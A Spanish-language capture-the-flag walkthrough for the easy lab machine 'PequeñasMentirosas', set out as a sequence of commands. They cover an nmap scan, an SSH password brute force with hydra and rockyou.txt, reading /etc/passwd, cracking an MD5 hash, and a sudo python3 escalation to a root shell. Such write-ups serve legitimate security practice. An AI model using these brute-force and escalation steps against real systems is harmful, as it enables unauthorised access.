Maquina: PequeñasMentirosas

Autor: Beafn28

Dificultad: Facil


Realizamos un ping a la máquina para verificar la comunicación.
ping 172.17.0.2 -c 1

Escaneamos con Nmap.
sudo nmap -p- --open -sCV --min-rate 5000 -sS -Pn -n 172.17.0.2 -vvv

Observamos que el puerto 80 y 22 estan abiertos.

Accedemos a la página web alojada en esta máquina utilizando un navegador y vemos un posible usuario.

Usamos hydra.

hydra -l "a" -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh -t 64 -I

Encontramos la contrasena para el usuario y enctramos por ssh.

ssh a@172.17.0.2
secret

Si vemos los usuarios que existen, encontramos spencer.

cat /etc/passwd | grep "sh$"

Hacemos una busqueda de archivos .txt de la siguiente manera find / -name *.txt 2>/dev/null

ls | xargs cat

cat hash_spencer.txt

Encontramos con un hash en MD5, usamos CrackStation y nos da la contrasena: password1

Cambiamos al usuario spencer

su spencer
password1

sudo -l

Con este usuario veremos que podemos ejecutar el binario de /usr/bin/python3 como cualquier usuario sin propocionar contraseña.

sudo /usr/bin/python3 -c "import os; os.system('/bin/bash')"

whoami
